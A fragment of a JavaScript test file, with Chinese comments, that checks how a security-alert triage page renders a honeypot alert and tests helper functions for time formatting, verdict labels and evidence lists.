      matched_alert_id: null, msgid: 'cloudwalker-honeypot', host_ip: '10.0.0.5', source_ip: '45.9.1.2',
      repeat_count: 3, verdict_label: '存疑', summary: '蜜罐触发，未见后续利用行为。',
    }),
    investigationBody: investigation({
      verdict: { ...investigation().verdict, verdict_label: '存疑', summary: '蜜罐触发，未见后续利用行为。' },
    }),
    handler: async target => (target.startsWith('/api/alerts/') ? respond({ error: '牧云没有这条事件' }, 502) : undefined),
    board: null,
  });
  await flush();

  assert.equal(region(host, 'main').hidden, false);
  assert.equal(text(region(host, 'title')), '蜜罐 · 10.0.0.5');
  assert.equal(text(region(host, 'type')), '蜜罐');
  const meta = text(region(host, 'meta'));
  assert.match(meta, /10\.0\.0\.5/);
  assert.match(meta, /来源 45\.9\.1\.2/);
  assert.match(meta, /重复 ×3/);
  assert.match(meta, /syslog:honeypot:/, '案件 ID 要在题干里，方便对上推送');
  assert.equal(region(host, 'state').textContent, '已完成');
  // 牧云照样问过一次，但读不到不影响正文
  assert.equal(calls.some(call => call.url.startsWith('/api/alerts/')), true);
  assert.match(visibleText(host), /蜜罐触发，未见后续利用行为。/);
});

// ---------- 纯函数 ----------

test('formatTime / formatClock：本地时区补齐，空值与非法值给「—」', () => {
  assert.equal(formatTime(iso(2026, 10, 13, 9, 41, 5)), '2026-11-13 09:41:05');
  assert.equal(formatTime(null), '—');
  assert.equal(formatTime('不是时间'), '—');
  assert.equal(formatClock(iso(2026, 10, 13, 9, 41, 5)), '09:41:05');
  assert.equal(formatClock(undefined), '—');
});

test('verdictLabelOf：只认三值枚举，其它一律 null（不拿 alert.verdict 占位值）', () => {
  assert.equal(verdictLabelOf({ verdict_label: '存疑' }, null), '存疑');
  assert.equal(verdictLabelOf(null, { verdict: { verdict_label: '误报' } }), '误报');
  assert.equal(verdictLabelOf({ verdict_label: '待研判' }, null), null);
  assert.equal(verdictLabelOf(null, null), null);
});

test('claimsOf / requiredEvidenceOf / entityOf / stepsOf / missingEvidenceOf：空输入不抛、坏元素过滤掉', () => {
  assert.deepEqual(claimsOf(null), []);
  assert.deepEqual(claimsOf({ verdict: { claims: [{ text: '  ' }, null, { text: 'a', citations: [] }] } }), [{ text: 'a', refs: [] }]);
  assert.deepEqual(requiredEvidenceOf(undefined), []);
  assert.deepEqual(requiredEvidenceOf({ required_evidence: [{ id: 'x', status: '未知状态' }] }), [
    { label: 'x', text: '未知状态', tone: 'missing', note: '' },
  ]);
  assert.deepEqual(entityOf({ kind: 'ip', label: '1.1.1.1' }), { type: 'ip', value: '1.1.1.1' });
  assert.deepEqual(entityOf(null), { type: '—', value: '—' });
  assert.deepEqual(stepsOf({ steps: [{ stage: 'A', detail: 'B', at: iso(2026, 10, 13, 9, 41, 5) }] }), [
    { time: '09:41:05', title: 'A', detail: 'B' },
  ]);
  assert.deepEqual(missingEvidenceOf({ missing_evidence: ['a', ''] }, null), ['a']);
  assert.deepEqual(missingEvidenceOf(null, { verdict: { missing_evidence: ['b'] } }), ['b']);
});
